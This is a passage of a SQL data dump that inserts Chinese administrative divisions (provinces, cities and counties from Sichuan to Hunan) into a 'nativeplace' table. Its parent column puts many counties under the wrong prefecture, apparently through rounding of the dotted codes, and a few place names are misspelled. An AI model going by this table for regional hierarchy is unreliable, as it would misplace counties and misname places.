县','12019.2','nativeplace',12019,2),(19232,'汶川县','12019.1','nativeplace',12019,2),(19231,'阿坝藏族羌族自治州','12019','nativeplace',12019,1),(19230,'简阳市','12018.4','nativeplace',12018,2),(19229,'乐至县','12018.3','nativeplace',12018,2),(19228,'安岳县','12018.2','nativeplace',12018,2),(19227,'雁江区','12018.1','nativeplace',12018,2),(19226,'资阳市','12018','nativeplace',12018,1),(19225,'平昌县','12017.4','nativeplace',12017,2),(19224,'南江县','12017.3','nativeplace',12017,2),(19223,'通江县','12017.2','nativeplace',12017,2),(19222,'巴州区','12017.1','nativeplace',12017,2),(19221,'巴中市','12017','nativeplace',12017,1),(19220,'宝兴县','12016.8','nativeplace',12017,2),(19219,'芦山县','12016.7','nativeplace',12017,2),(19218,'天全县','12016.6','nativeplace',12017,2),(19217,'石棉县','12016.5','nativeplace',12017,2),(19216,'汉源县','12016.4','nativeplace',12016,2),(19215,'荥经县','12016.3','nativeplace',12016,2),(19214,'名山县','12016.2','nativeplace',12016,2),(19213,'雨城区','12016.1','nativeplace',12016,2),(19212,'雅安市','12016','nativeplace',12016,1),(19211,'万源市','12015.7','nativeplace',12016,2),(19210,'渠　县','12015.6','nativeplace',12016,2),(19209,'大竹县','12015.5','nativeplace',12016,2),(19208,'开江县','12015.4','nativeplace',12015,2),(19207,'宣汉县','12015.3','nativeplace',12015,2),(19206,'达　县','12015.2','nativeplace',12015,2),(19205,'通川区','12015.1','nativeplace',12015,2),(19204,'达州市','12015','nativeplace',12015,1),(19203,'华莹市','12014.5','nativeplace',12015,2),(19202,'邻水县','12014.4','nativeplace',12014,2),(19201,'武胜县','12014.3','nativeplace',12014,2),(19200,'岳池县','12014.2','nativeplace',12014,2),(19199,'广安区','12014.1','nativeplace',12014,2),(19198,'广安市','12014','nativeplace',12014,1),(19197,'屏山县','12013.10','nativeplace',12013,2),(19196,'兴文县','12013.9','nativeplace',12014,2),(19195,'筠连县','12013.8','nativeplace',12014,2),(19194,'珙　县','12013.7','nativeplace',12014,2),(19193,'高　县','12013.6','nativeplace',12014,2),(19192,'长宁县','12013.5','nativeplace',12014,2),(19191,'江安县','12013.4','nativeplace',12013,2),(19190,'南溪县','12013.3','nativeplace',12013,2),(19189,'宜宾县','12013.2','nativeplace',12013,2),(19188,'翠屏区','12013.1','nativeplace',12013,2),(19187,'宜宾市','12013','nativeplace',12013,1),(19186,'青神县','12012.6','nativeplace',12013,2),(19185,'丹棱县','12012.5','nativeplace',12013,2),(19184,'洪雅县','12012.4','nativeplace',12012,2),(19183,'彭山县','12012.3','nativeplace',12012,2),(19182,'仁寿县','12012.2','nativeplace',12012,2),(19181,'东坡区','12012.1','nativeplace',12012,2),(19180,'眉山市','12012','nativeplace',12012,1),(19179,'阆中市','12011.9','nativeplace',12012,2),(19178,'西充县','12011.8','nativeplace',12012,2),(19177,'仪陇县','12011.7','nativeplace',12012,2),(19176,'蓬安县','12011.6','nativeplace',12012,2),(19175,'营山县','12011.5','nativeplace',12012,2),(19174,'南部县','12011.4','nativeplace',12011,2),(19173,'嘉陵区','12011.3','nativeplace',12011,2),(19172,'高坪区','12011.2','nativeplace',12011,2),(19171,'顺庆区','12011.1','nativeplace',12011,2),(19170,'南充市','12011','nativeplace',12011,1),(19169,'峨眉山市','12010.11','nativeplace',12010,2),(19168,'马边彝族自治县','12010.10','nativeplace',12010,2),(19167,'峨边彝族自治县','12010.9','nativeplace',12011,2),(19166,'沐川县','12010.8','nativeplace',12011,2),(19165,'夹江县','12010.7','nativeplace',12011,2),(19164,'井研县','12010.6','nativeplace',12011,2),(19163,'犍为县','12010.5','nativeplace',12011,2),(19162,'金口河区','12010.4','nativeplace',12010,2),(19161,'五通桥区','12010.3','nativeplace',12010,2),(19160,'沙湾区','12010.2','nativeplace',12010,2),(19159,'市中区','12010.1','nativeplace',12010,2),(19158,'乐山市','12010','nativeplace',12010,1),(19157,'隆昌县','12009.5','nativeplace',12010,2),(19156,'资中县','12009.4','nativeplace',12009,2),(19155,'威远县','12009.3','nativeplace',12009,2),(19154,'东兴区','12009.2','nativeplace',12009,2),(19153,'市中区','12009.1','nativeplace',12009,2),(19152,'内江市','12009','nativeplace',12009,1),(19151,'大英县','12008.5','nativeplace',12009,2),(19150,'射洪县','12008.4','nativeplace',12008,2),(19149,'蓬溪县','12008.3','nativeplace',12008,2),(19148,'安居区','12008.2','nativeplace',12008,2),(19147,'船山区','12008.1','nativeplace',12008,2),(19146,'遂宁市','12008','nativeplace',12008,1),(19145,'苍溪县','12007.7','nativeplace',12008,2),(19144,'剑阁县','12007.6','nativeplace',12008,2),(19143,'青川县','12007.5','nativeplace',12008,2),(19142,'旺苍县','12007.4','nativeplace',12007,2),(19141,'朝天区','12007.3','nativeplace',12007,2),(19140,'元坝区','12007.2','nativeplace',12007,2),(19139,'市中区','12007.1','nativeplace',12007,2),(19138,'广元市','12007','nativeplace',12007,1),(19137,'江油市','12006.9','nativeplace',12007,2),(19136,'平武县','12006.8','nativeplace',12007,2),(19135,'北川羌族自治县','12006.7','nativeplace',12007,2),(19134,'梓潼县','12006.6','nativeplace',12007,2),(19133,'安　县','12006.5','nativeplace',12007,2),(19132,'盐亭县','12006.4','nativeplace',12006,2),(19131,'三台县','12006.3','nativeplace',12006,2),(19130,'游仙区','12006.2','nativeplace',12006,2),(19129,'涪城区','12006.1','nativeplace',12006,2),(19128,'绵阳市','12006','nativeplace',12006,1),(19127,'绵竹市','12005.6','nativeplace',12006,2),(19126,'什邡市','12005.5','nativeplace',12006,2),(19125,'广汉市','12005.4','nativeplace',12005,2),(19124,'罗江县','12005.3','nativeplace',12005,2),(19123,'中江县','12005.2','nativeplace',12005,2),(19122,'旌阳区','12005.1','nativeplace',12005,2),(19121,'德阳市','12005','nativeplace',12005,1),(19120,'古蔺县','12004.7','nativeplace',12005,2),(19119,'叙永县','12004.6','nativeplace',12005,2),(19118,'合江县','12004.5','nativeplace',12005,2),(19117,'泸　县','12004.4','nativeplace',12004,2),(19116,'龙马潭区','12004.3','nativeplace',12004,2),(19115,'纳溪区','12004.2','nativeplace',12004,2),(19114,'江阳区','12004.1','nativeplace',12004,2),(19113,'泸州市','12004','nativeplace',12004,1),(19112,'盐边县','12003.5','nativeplace',12004,2),(19111,'米易县','12003.4','nativeplace',12003,2),(19110,'仁和区','12003.3','nativeplace',12003,2),(19109,'西　区','12003.2','nativeplace',12003,2),(19108,'东　区','12003.1','nativeplace',12003,2),(19107,'攀枝花市','12003','nativeplace',12003,1),(19106,'富顺县','12002.6','nativeplace',12003,2),(19105,'荣　县','12002.5','nativeplace',12003,2),(19104,'沿滩区','12002.4','nativeplace',12002,2),(19103,'大安区','12002.3','nativeplace',12002,2),(19102,'贡井区','12002.2','nativeplace',12002,2),(19101,'自流井区','12002.1','nativeplace',12002,2),(19100,'自贡市','12002','nativeplace',12002,1),(19099,'崇州市','12001.19','nativeplace',12001,2),(19098,'邛崃市','12001.18','nativeplace',12001,2),(19097,'彭州市','12001.17','nativeplace',12001,2),(19096,'都江堰市','12001.16','nativeplace',12001,2),(19095,'新津县','12001.15','nativeplace',12001,2),(19094,'蒲江县','12001.14','nativeplace',12001,2),(19093,'大邑县','12001.13','nativeplace',12001,2),(19092,'郫　县','12001.12','nativeplace',12001,2),(19091,'双流县','12001.11','nativeplace',12001,2),(19090,'金堂县','12001.10','nativeplace',12001,2),(19089,'温江区','12001.9','nativeplace',12002,2),(19088,'新都区','12001.8','nativeplace',12002,2),(19087,'青白江区','12001.7','nativeplace',12002,2),(19086,'龙泉驿区','12001.6','nativeplace',12002,2),(19085,'成华区','12001.5','nativeplace',12002,2),(19084,'武侯区','12001.4','nativeplace',12001,2),(19083,'金牛区','12001.3','nativeplace',12001,2),(19082,'青羊区','12001.2','nativeplace',12001,2),(19081,'锦江区','12001.1','nativeplace',12001,2),(19080,'成都市','12001','nativeplace',12001,1),(19079,'四川省','12000','nativeplace',12000,0),(19078,'南川市','11540','nativeplace',11540,1),(19077,'永川市','11539','nativeplace',11539,1),(19076,'合川市','11538','nativeplace',11538,1),(19075,'江津市','11537','nativeplace',11537,1),(19074,'彭水苗族土家族自治县','11536','nativeplace',11536,1),(19073,'酉阳土家族苗族自治县','11535','nativeplace',11535,1),(19072,'秀山土家族苗族自治县','11534','nativeplace',11534,1),(19071,'石柱土家族自治县','11533','nativeplace',11533,1),(19070,'巫溪县','11532','nativeplace',11532,1),(19069,'巫山县','11531','nativeplace',11531,1),(19068,'奉节县','11530','nativeplace',11530,1),(19067,'云阳县','11529','nativeplace',11529,1),(19066,'开　县','11528','nativeplace',11528,1),(19065,'忠　县','11527','nativeplace',11527,1),(19064,'武隆县','11526','nativeplace',11526,1),(19063,'垫江县','11525','nativeplace',11525,1),(19062,'丰都县','11524','nativeplace',11524,1),(19061,'城口县','11523','nativeplace',11523,1),(19060,'梁平县','11522','nativeplace',11522,1),(19059,'璧山县','11521','nativeplace',11521,1),(19058,'荣昌县','11520','nativeplace',11520,1),(19057,'大足县','11519','nativeplace',11519,1),(19056,'铜梁县','11518','nativeplace',11518,1),(19055,'潼南县','11517','nativeplace',11517,1),(19054,'綦江县','11516','nativeplace',11516,1),(19053,'长寿区','11515','nativeplace',11515,1),(19052,'黔江区','11514','nativeplace',11514,1),(19051,'巴南区','11513','nativeplace',11513,1),(19050,'渝北区','11512','nativeplace',11512,1),(19049,'双桥区','11511','nativeplace',11511,1),(19048,'万盛区','11510','nativeplace',11510,1),(19047,'北碚区','11509','nativeplace',11509,1),(19046,'南岸区','11508','nativeplace',11508,1),(19045,'九龙坡区','11507','nativeplace',11507,1),(19044,'沙坪坝区','11506','nativeplace',11506,1),(19043,'江北区','11505','nativeplace',11505,1),(19042,'大渡口区','11504','nativeplace',11504,1),(19041,'渝中区','11503','nativeplace',11503,1),(19040,'涪陵区','11502','nativeplace',11502,1),(19039,'万州区','11501','nativeplace',11501,1),(19038,'重庆市','11500','nativeplace',11500,0),(19037,'中沙群岛的岛礁及其海域','11003.19','nativeplace',11003,2),(19036,'南沙群岛','11003.18','nativeplace',11003,2),(19035,'西沙群岛','11003.17','nativeplace',11003,2),(19034,'琼中黎族苗族自治县','11003.16','nativeplace',11003,2),(19033,'保亭黎族苗族自治县','11003.15','nativeplace',11003,2),(19032,'陵水黎族自治县','11003.14','nativeplace',11003,2),(19031,'乐东黎族自治县','11003.13','nativeplace',11003,2),(19030,'昌江黎族自治县','11003.12','nativeplace',11003,2),(19029,'白沙黎族自治县','11003.11','nativeplace',11003,2),(19028,'临高县','11003.10','nativeplace',11003,2),(19027,'澄迈县','11003.9','nativeplace',11004,2),(19026,'屯昌县','11003.8','nativeplace',11004,2),(19025,'定安县','11003.7','nativeplace',11004,2),(19024,'东方市','11003.6','nativeplace',11004,2),(19023,'万宁市','11003.5','nativeplace',11004,2),(19022,'文昌市','11003.4','nativeplace',11003,2),(19021,'儋州市','11003.3','nativeplace',11003,2),(19020,'琼海市','11003.2','nativeplace',11003,2),(19019,'五指山市','11003.1','nativeplace',11003,2),(19018,'省直辖县级行政单位','11003','nativeplace',11003,1),(19017,'三亚市','11002','nativeplace',11002,1),(19016,'美兰区','11001.4','nativeplace',11001,2),(19015,'琼山区','11001.3','nativeplace',11001,2),(19014,'龙华区','11001.2','nativeplace',11001,2),(19013,'秀英区','11001.1','nativeplace',11001,2),(19012,'海口市','11001','nativeplace',11001,1),(19011,'海南省','11000','nativeplace',11000,0),(19010,'凭祥市','10514.7','nativeplace',10515,2),(19009,'天等县','10514.6','nativeplace',10515,2),(19008,'大新县','10514.5','nativeplace',10515,2),(19007,'龙州县','10514.4','nativeplace',10514,2),(19006,'宁明县','10514.3','nativeplace',10514,2),(19005,'扶绥县','10514.2','nativeplace',10514,2),(19004,'江洲区','10514.1','nativeplace',10514,2),(19003,'崇左市','10514','nativeplace',10514,1),(19002,'合山市','10513.6','nativeplace',10514,2),(19001,'金秀瑶族自治县','10513.5','nativeplace',10514,2),(19000,'武宣县','10513.4','nativeplace',10513,2),(18999,'象州县','10513.3','nativeplace',10513,2),(18998,'忻城县','10513.2','nativeplace',10513,2),(18997,'兴宾区','10513.1','nativeplace',10513,2),(18996,'来宾市','10513','nativeplace',10513,1),(18995,'宜州市','10512.11','nativeplace',10512,2),(18994,'大化瑶族自治县','10512.10','nativeplace',10512,2),(18993,'都安瑶族自治县','10512.9','nativeplace',10513,2),(18992,'巴马瑶族自治县','10512.8','nativeplace',10513,2),(18991,'环江毛南族自治县','10512.7','nativeplace',10513,2),(18990,'罗城仫佬族自治县','10512.6','nativeplace',10513,2),(18989,'东兰县','10512.5','nativeplace',10513,2),(18988,'凤山县','10512.4','nativeplace',10512,2),(18987,'天峨县','10512.3','nativeplace',10512,2),(18986,'南丹县','10512.2','nativeplace',10512,2),(18985,'金城江区','10512.1','nativeplace',10512,2),(18984,'河池市','10512','nativeplace',10512,1),(18983,'富川瑶族自治县','10511.4','nativeplace',10511,2),(18982,'钟山县','10511.3','nativeplace',10511,2),(18981,'昭平县','10511.2','nativeplace',10511,2),(18980,'八步区','10511.1','nativeplace',10511,2),(18979,'贺州市','10511','nativeplace',10511,1),(18978,'隆林各族自治县','10510.12','nativeplace',10510,2),(18977,'西林县','10510.11','nativeplace',10510,2),(18976,'田林县','10510.10','nativeplace',10510,2),(18975,'乐业县','10510.9','nativeplace',10511,2),(18974,'凌云县','10510.8','nativeplace',10511,2),(18973,'那坡县','10510.7','nativeplace',10511,2),(18972,'靖西县','10510.6','nativeplace',10511,2),(18971,'德保县','10510.5','nativeplace',10511,2),(18970,'平果县','10510.4','nativeplace',10510,2),(18969,'田东县','10510.3','nativeplace',10510,2),(18968,'田阳县','10510.2','nativeplace',10510,2),(18967,'右江区','10510.1','nativeplace',10510,2),(18966,'百色市','10510','nativeplace',10510,1),(18965,'北流市','10509.6','nativeplace',10510,2),(18964,'兴业县','10509.5','nativeplace',10510,2),(18963,'博白县','10509.4','nativeplace',10509,2),(18962,'陆川县','10509.3','nativeplace',10509,2),(18961,'容　县','10509.2','nativeplace',10509,2),(18960,'玉州区','10509.1','nativeplace',10509,2),(18959,'玉林市','10509','nativeplace',10509,1),(18958,'桂平市','10508.5','nativeplace',10509,2),(18957,'平南县','10508.4','nativeplace',10508,2),(18956,'覃塘区','10508.3','nativeplace',10508,2),(18955,'港南区','10508.2','nativeplace',10508,2),(18954,'港北区','10508.1','nativeplace',10508,2),(18953,'贵港市','10508','nativeplace',10508,1),(18952,'浦北县','10507.4','nativeplace',10507,2),(18951,'灵山县','10507.3','nativeplace',10507,2),(18950,'钦北区','10507.2','nativeplace',10507,2),(18949,'钦南区','10507.1','nativeplace',10507,2),(18948,'钦州市','10507','nativeplace',10507,1),(18947,'东兴市','10506.4','nativeplace',10506,2),(18946,'上思县','10506.3','nativeplace',10506,2),(18945,'防城区','10506.2','nativeplace',10506,2),(18944,'港口区','10506.1','nativeplace',10506,2),(18943,'防城港市','10506','nativeplace',10506,1),(18942,'合浦县','10505.4','nativeplace',10505,2),(18941,'铁山港区','10505.3','nativeplace',10505,2),(18940,'银海区','10505.2','nativeplace',10505,2),(18939,'海城区','10505.1','nativeplace',10505,2),(18938,'北海市','10505','nativeplace',10505,1),(18937,'岑溪市','10504.7','nativeplace',10505,2),(18936,'蒙山县','10504.6','nativeplace',10505,2),(18935,'藤　县','10504.5','nativeplace',10505,2),(18934,'苍梧县','10504.4','nativeplace',10504,2),(18933,'长洲区','10504.3','nativeplace',10504,2),(18932,'蝶山区','10504.2','nativeplace',10504,2),(18931,'万秀区','10504.1','nativeplace',10504,2),(18930,'梧州市','10504','nativeplace',10504,1),(18929,'恭城瑶族自治县','10503.17','nativeplace',10503,2),(18928,'荔蒲县','10503.16','nativeplace',10503,2),(18927,'平乐县','10503.15','nativeplace',10503,2),(18926,'资源县','10503.14','nativeplace',10503,2),(18925,'龙胜各族自治县','10503.13','nativeplace',10503,2),(18924,'灌阳县','10503.12','nativeplace',10503,2),(18923,'永福县','10503.11','nativeplace',10503,2),(18922,'兴安县','10503.10','nativeplace',10503,2),(18921,'全州县','10503.9','nativeplace',10504,2),(18920,'灵川县','10503.8','nativeplace',10504,2),(18919,'临桂县','10503.7','nativeplace',10504,2),(18918,'阳朔县','10503.6','nativeplace',10504,2),(18917,'雁山区','10503.5','nativeplace',10504,2),(18916,'七星区','10503.4','nativeplace',10503,2),(18915,'象山区','10503.3','nativeplace',10503,2),(18914,'叠彩区','10503.2','nativeplace',10503,2),(18913,'秀峰区','10503.1','nativeplace',10503,2),(18912,'桂林市','10503','nativeplace',10503,1),(18911,'三江侗族自治县','10502.10','nativeplace',10502,2),(18910,'融水苗族自治县','10502.9','nativeplace',10503,2),(18909,'融安县','10502.8','nativeplace',10503,2),(18908,'鹿寨县','10502.7','nativeplace',10503,2),(18907,'柳城县','10502.6','nativeplace',10503,2),(18906,'柳江县','10502.5','nativeplace',10503,2),(18905,'柳北区','10502.4','nativeplace',10502,2),(18904,'柳南区','10502.3','nativeplace',10502,2),(18903,'鱼峰区','10502.2','nativeplace',10502,2),(18902,'城中区','10502.1','nativeplace',10502,2),(18901,'柳州市','10502','nativeplace',10502,1),(18900,'横　县','10501.12','nativeplace',10501,2),(18899,'宾阳县','10501.11','nativeplace',10501,2),(18898,'上林县','10501.10','nativeplace',10501,2),(18897,'马山县','10501.9','nativeplace',10502,2),(18896,'隆安县','10501.8','nativeplace',10502,2),(18895,'武鸣县','10501.7','nativeplace',10502,2),(18894,'邕宁区','10501.6','nativeplace',10502,2),(18893,'良庆区','10501.5','nativeplace',10502,2),(18892,'西乡塘区','10501.4','nativeplace',10501,2),(18891,'江南区','10501.3','nativeplace',10501,2),(18890,'青秀区','10501.2','nativeplace',10501,2),(18889,'兴宁区','10501.1','nativeplace',10501,2),(18888,'南宁市','10501','nativeplace',10501,1),(18887,'广西壮族自治区','10500','nativeplace',10500,0),(18886,'罗定市','10021.5','nativeplace',10022,2),(18885,'云安县','10021.4','nativeplace',10021,2),(18884,'郁南县','10021.3','nativeplace',10021,2),(18883,'新兴县','10021.2','nativeplace',10021,2),(18882,'云城区','10021.1','nativeplace',10021,2),(18881,'云浮市','10021','nativeplace',10021,1),(18880,'普宁市','10020.5','nativeplace',10021,2),(18879,'惠来县','10020.4','nativeplace',10020,2),(18878,'揭西县','10020.3','nativeplace',10020,2),(18877,'揭东县','10020.2','nativeplace',10020,2),(18876,'榕城区','10020.1','nativeplace',10020,2),(18875,'揭阳市','10020','nativeplace',10020,1),(18874,'饶平县','10019.2','nativeplace',10019,2),(18873,'潮安县','10019.1','nativeplace',10019,2),(18872,'潮州市','10019','nativeplace',10019,1),(18871,'中山市','10018','nativeplace',10018,1),(18870,'东莞市','10017','nativeplace',10017,1),(18869,'连州市','10016.8','nativeplace',10017,2),(18868,'英德市','10016.7','nativeplace',10017,2),(18867,'清新县','10016.6','nativeplace',10017,2),(18866,'连南瑶族自治县','10016.5','nativeplace',10017,2),(18865,'连山壮族瑶族自治县','10016.4','nativeplace',10016,2),(18864,'阳山县','10016.3','nativeplace',10016,2),(18863,'佛冈县','10016.2','nativeplace',10016,2),(18862,'清城区','10016.1','nativeplace',10016,2),(18861,'清远市','10016','nativeplace',10016,1),(18860,'阳春市','10015.4','nativeplace',10015,2),(18859,'阳东县','10015.3','nativeplace',10015,2),(18858,'阳西县','10015.2','nativeplace',10015,2),(18857,'江城区','10015.1','nativeplace',10015,2),(18856,'阳江市','10015','nativeplace',10015,1),(18855,'东源县','10014.6','nativeplace',10015,2),(18854,'和平县','10014.5','nativeplace',10015,2),(18853,'连平县','10014.4','nativeplace',10014,2),(18852,'龙川县','10014.3','nativeplace',10014,2),(18851,'紫金县','10014.2','nativeplace',10014,2),(18850,'源城区','10014.1','nativeplace',10014,2),(18849,'河源市','10014','nativeplace',10014,1),(18848,'陆丰市','10013.4','nativeplace',10013,2),(18847,'陆河县','10013.3','nativeplace',10013,2),(18846,'海丰县','10013.2','nativeplace',10013,2),(18845,'城　区','10013.1','nativeplace',10013,2),(18844,'汕尾市','10013','nativeplace',10013,1),(18843,'兴宁市','10012.8','nativeplace',10013,2),(18842,'蕉岭县','10012.7','nativeplace',10013,2),(18841,'平远县','10012.6','nativeplace',10013,2),(18840,'五华县','10012.5','nativeplace',10013,2),(18839,'丰顺县','10012.4','nativeplace',10012,2),(18838,'大埔县','10012.3','nativeplace',10012,2),(18837,'梅　县','10012.2','nativeplace',10012,2),(18836,'梅江区','10012.1','nativeplace',10012,2),(18835,'梅州市','10012','nativeplace',10012,1),(18834,'龙门县','10011.5','nativeplace',10012,2),(18833,'惠东县','10011.4','nativeplace',10011,2),(18832,'博罗县','10011.3','nativeplace',10011,2),(18831,'惠阳区','10011.2','nativeplace',10011,2),(18830,'惠城区','10011.1','nativeplace',10011,2),(18829,'惠州市','10011','nativeplace',10011,1),(18828,'四会市','10010.8','nativeplace',10011,2),(18827,'高要市','10010.7','nativeplace',10011,2),(18826,'德庆县','10010.6','nativeplace',10011,2),(18825,'封开县','10010.5','nativeplace',10011,2),(18824,'怀集县','10010.4','nativeplace',10010,2),(18823,'广宁县','10010.3','nativeplace',10010,2),(18822,'鼎湖区','10010.2','nativeplace',10010,2),(18821,'端州区','10010.1','nativeplace',10010,2),(18820,'肇庆市','10010','nativeplace',10010,1),(18819,'信宜市','10009.6','nativeplace',10010,2),(18818,'化州市','10009.5','nativeplace',10010,2),(18817,'高州市','10009.4','nativeplace',10009,2),(18816,'电白县','10009.3','nativeplace',10009,2),(18815,'茂港区','10009.2','nativeplace',10009,2),(18814,'茂南区','10009.1','nativeplace',10009,2),(18813,'茂名市','10009','nativeplace',10009,1),(18812,'吴川市','10008.9','nativeplace',10009,2),(18811,'雷州市','10008.8','nativeplace',10009,2),(18810,'廉江市','10008.7','nativeplace',10009,2),(18809,'徐闻县','10008.6','nativeplace',10009,2),(18808,'遂溪县','10008.5','nativeplace',10009,2),(18807,'麻章区','10008.4','nativeplace',10008,2),(18806,'坡头区','10008.3','nativeplace',10008,2),(18805,'霞山区','10008.2','nativeplace',10008,2),(18804,'赤坎区','10008.1','nativeplace',10008,2),(18803,'湛江市','10008','nativeplace',10008,1),(18802,'恩平市','10007.7','nativeplace',10008,2),(18801,'鹤山市','10007.6','nativeplace',10008,2),(18800,'开平市','10007.5','nativeplace',10008,2),(18799,'台山市','10007.4','nativeplace',10007,2),(18798,'新会区','10007.3','nativeplace',10007,2),(18797,'江海区','10007.2','nativeplace',10007,2),(18796,'蓬江区','10007.1','nativeplace',10007,2),(18795,'江门市','10007','nativeplace',10007,1),(18794,'高明区','10006.5','nativeplace',10007,2),(18793,'三水区','10006.4','nativeplace',10006,2),(18792,'顺德区','10006.3','nativeplace',10006,2),(18791,'南海区','10006.2','nativeplace',10006,2),(18790,'禅城区','10006.1','nativeplace',10006,2),(18789,'佛山市','10006','nativeplace',10006,1),(18788,'南澳县','10005.7','nativeplace',10006,2),(18787,'澄海区','10005.6','nativeplace',10006,2),(18786,'潮南区','10005.5','nativeplace',10006,2),(18785,'潮阳区','10005.4','nativeplace',10005,2),(18784,'濠江区','10005.3','nativeplace',10005,2),(18783,'金平区','10005.2','nativeplace',10005,2),(18782,'龙湖区','10005.1','nativeplace',10005,2),(18781,'汕头市','10005','nativeplace',10005,1),(18780,'金湾区','10004.3','nativeplace',10004,2),(18779,'斗门区','10004.2','nativeplace',10004,2),(18778,'洲区','10004.1','nativeplace',10004,2),(18777,'珠海市','10004','nativeplace',10004,1),(18776,'盐田区','10003.6','nativeplace',10004,2),(18775,'龙岗区','10003.5','nativeplace',10004,2),(18774,'宝安区','10003.4','nativeplace',10003,2),(18773,'南山区','10003.3','nativeplace',10003,2),(18772,'福田区','10003.2','nativeplace',10003,2),(18771,'罗湖区','10003.1','nativeplace',10003,2),(18770,'深圳市','10003','nativeplace',10003,1),(18769,'南雄市','10002.10','nativeplace',10002,2),(18768,'乐昌市','10002.9','nativeplace',10003,2),(18767,'新丰县','10002.8','nativeplace',10003,2),(18766,'乳源瑶族自治县','10002.7','nativeplace',10003,2),(18765,'翁源县','10002.6','nativeplace',10003,2),(18764,'仁化县','10002.5','nativeplace',10003,2),(18763,'始兴县','10002.4','nativeplace',10002,2),(18762,'曲江区','10002.3','nativeplace',10002,2),(18761,'浈江区','10002.2','nativeplace',10002,2),(18760,'武江区','10002.1','nativeplace',10002,2),(18759,'韶关市','10002','nativeplace',10002,1),(18758,'从化市','10001.12','nativeplace',10001,2),(18757,'增城市','10001.11','nativeplace',10001,2),(18756,'花都区','10001.10','nativeplace',10001,2),(18755,'番禺区','10001.9','nativeplace',10002,2),(18754,'黄埔区','10001.8','nativeplace',10002,2),(18753,'白云区','10001.7','nativeplace',10002,2),(18752,'芳村区','10001.6','nativeplace',10002,2),(18751,'天河区','10001.5','nativeplace',10002,2),(18750,'海珠区','10001.4','nativeplace',10001,2),(18749,'越秀区','10001.3','nativeplace',10001,2),(18748,'荔湾区','10001.2','nativeplace',10001,2),(18747,'东山区','10001.1','nativeplace',10001,2),(18746,'广州市','10001','nativeplace',10001,1),(18745,'广东省','10000','nativeplace',10000,0),(18744,'龙山县','9514.8','nativeplace',9515,2),(18743,'永顺县','9514.7','nativeplace',9515,2),(18742,'古丈县','9514.6','nativeplace',9515,2),(18741,'保靖县','9514.5','nativeplace',9515,2),(18740,'花垣县','9514.4','nativeplace',9514,2),(18739,'凤凰县','9514.3','nativeplace',9514,2),(18738,'泸溪县','9514.2','nativeplace',9514,2),(18737,'吉首市','9514.1','nativeplace',9514,2),(18736,'湘西土家族苗族自治州','9514','nativeplace',9514,1),(18735,'涟源市','9513.5','nativeplace',9514,2),(18734,'冷水江市','9513.4','nativeplace',9513,2),(18733,'新化县','9513.3','nativeplace',9513,2),(18732,'双峰县','9513.2','nativeplace',9513,2),(18731,'娄星区','9513.1','nativeplace',9513,2),(18730,'娄底市','9513','nativeplace',9513,1),(18729,'洪江市','9512.12','nativeplace',9512,2),(18728,'通道侗族自治县','9512.11','nativeplace',9512,2),(18727,'靖州苗族侗族自治县','9512.10','nativeplace',9512,2),(18726,'芷江侗族自治县','9512.9','nativeplace',9513,2),(18725,'新晃侗族自治县','9512.8','nativeplace',9513,2),(18724,'麻阳苗族自治县','9512.7','nativeplace',9513,2),(18723,'会同县','9512.6','nativeplace',9513,2),(18722,'溆浦县','9512.5','nativeplace',9513,2),(18721,'辰溪县','9512.4','nativeplace',9512,2),(18720,'沅陵县','9512.3','nativeplace',9512,2),(18719,'中方县','9512.2','nativeplace',9512,2),(18718,'鹤城区','9512.1','nativeplace',9512,2),(18717,'怀化市','9512','nativeplace',9512,1),(18716,'江华瑶族自治县','9511.11','nativeplace',9511,2),(18715,'新田县','9511.10','nativeplace',9511,2),(18714,'蓝山县','9511.9','nativeplace',9512,2),(18713,'宁远县','9511.8','nativeplace',9512,2),(18712,'江永县','9511.7','nativeplace',9512,2),(18711,'道　县','9511.6','nativeplace',9512,2),(18710,'双牌县','9511.5','nativeplace',9512,2),(18709,'东安县','9511.4','nativeplace',9511,2),(18708,'祁阳县','9511.3','nativeplace',9511,2),(18707,'冷水滩区','9511.2','nativeplace',9511,2),(18706,'芝山区','9511.1','nativeplace',9511,2),(18705,'永州市','9511','nativeplace',9511,1),(18704,'资兴市','9510.11','nativeplace',9510,2),(18703,'安仁县','9510.10','nativeplace',9510,2),(18702,'桂东县','9510.9','nativeplace',9511,2),(18701,'汝城县','9510.8','nativeplace',9511,2),(18700,'临武县','9510.7','nativeplace',9511,2),(18699,'嘉禾县','9510.6','nativeplace',9511,2),(18698,'永兴县','9510.5','nativeplace',9511,2),(18697,'宜章县','9510.4','nativeplace',9510,2),(18696,'桂阳县','9510.3','nativeplace',9510,2),(18695,'苏仙区','9510.2','nativeplace',9510,2),(18694,'北湖区','9510.1','nativeplace',9510,2),(18693,'郴州市','9510','nativeplace',9510,1),(18692,'沅江市','9509.6','nativeplace',9510,2),(18691,'安化县','9509.5','nativeplace',9510,2),(18690,'桃江县','9509.4','nativeplace',9509,2),(18689,'南　县','9509.3','nativeplace',9509,2),(18688,'赫山区','9509.2','nativeplace',9509,2),(18687,'资阳区','9509.1','nativeplace',9509,2),(18686,'益阳市','9509','nativeplace',9509,1),(18685,'桑植县','9508.4','nativeplace',9508,2),(18684,'慈利县','9508.3','nativeplace',9508,2),(18683,'武陵源区','9508.2','nativeplace',9508,2),(18682,'永定区','9508.1','nativeplace',9508,2),(18681,'张家界市','9508','nativeplace',9508,1),(18680,'津市市','9507.9','nativeplace',9508,2),(18679,'石门县','9507.8','nativeplace',9508,2),(18678,'桃源县','9507.7','nativeplace',9508,2),(18677,'临澧县','9507.6','nativeplace',9508,2),(18676,'澧　县','9507.5','nativeplace',9508,2),(18675,'汉寿县','9507.4','nativeplace',9507,2),(18674,'安乡县','9507.3','nativeplace',9507,2),(18673,'鼎城区','9507.2','nativeplace',9507,2),(18672,'武陵区','9507.1','nativeplace',9507,2),(18671,'常德市','9507','nativeplace',9507,1),(18670,'临湘市','9506.9','nativeplace',9507,2),(18669,'汨罗市','9506.8','nativeplace',9507,2),(18668,'平江县','9506.7','nativeplace',9507,2),(18667,'湘阴县','9506.6','nativeplace',9507,2),(18666,'华容县','9506.5','nativeplace',9507,2),(18665,'岳阳县','9506.4','nativeplace',9506,2),(18664,'君山区','9506.3','nativeplace',9506,2),(18663,'云溪区','9506.2','nativeplace',9506,2),(18662,'岳阳楼区','9506.1','nativeplace',9506,2),(18661,'岳阳市','9506','nativeplace',9506,1),(18660,'武冈市','9505.12','nativeplace',9505,2),(18659,'城步苗族自治县','9505.11','nativeplace',9505,2),(18658,'新宁县','9505.10','nativeplace',9505,2),(18657,'绥宁县','9505.9','nativeplace',9506,2),(18656,'洞口县','9505.8','nativeplac